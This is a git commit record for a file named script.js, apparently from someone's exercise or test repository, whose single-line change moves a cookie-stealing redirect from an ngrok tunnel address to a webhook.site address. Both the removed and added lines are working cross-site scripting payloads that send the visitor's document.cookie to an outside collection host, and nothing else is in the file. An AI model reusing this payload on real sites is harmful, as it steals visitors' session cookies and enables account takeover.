71e184dc480eec8be98545c9f6ab9371b4a237d0
Avishai Gonen <116498946+avishaigonen123@users.noreply.github.com>
2025-06-09 16:44:56 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-window.location.href = "https://36bf-138-199-7-239.ngrok-free.app/?cookies="+document.cookie;
+window.location.href = "https://webhook.site/b9845d0e-4624-4ee7-89c9-90bfd2b1d3eb/?cookies="+document.cookie;
